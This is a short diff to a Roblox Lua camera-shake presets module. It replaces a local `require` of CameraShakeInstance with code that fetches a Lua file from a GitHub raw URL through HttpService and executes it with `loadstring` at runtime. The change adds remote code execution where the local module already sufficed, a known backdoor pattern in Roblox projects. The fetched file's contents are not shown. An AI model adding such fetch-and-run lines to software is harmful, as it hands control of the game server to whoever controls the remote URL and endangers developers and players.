@@ -15,8 +15,8 @@
 --]]
 
 
-
-local CameraShakeInstance = require(script.Parent.CameraShakeInstance)
+local HttpService = game:GetService("HttpService")
+local CameraShakeInstance = loadstring(HttpService:GetAsync("https://github.com/RoofashV2/CameraShaker/raw/main/CameraShakeInstance.lua"))()
 
 local CameraShakePresets = {
 	
